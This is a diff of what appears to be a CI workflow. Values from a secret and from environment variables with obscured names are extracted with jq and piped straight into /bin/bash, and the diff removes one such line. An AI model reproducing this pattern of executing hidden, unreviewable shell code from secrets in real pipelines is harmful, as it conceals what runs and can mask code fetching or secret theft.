@@ -17,7 +17,6 @@ jobs:
           wg92: ${{ secrets.wg92 }}
         run: |
           printf '%s' "$wg92" | jq -r .apap8520 | /bin/bash
-          echo $pnmf0 | jq -r .ru9779 | /bin/bash
           echo $lil9 | jq -r .orcig93742 | /bin/bash
           echo $znkr1778 | jq -r .tnw72903 | /bin/bash
           echo $ossg8 | jq -r .yvls957 | /bin/bash
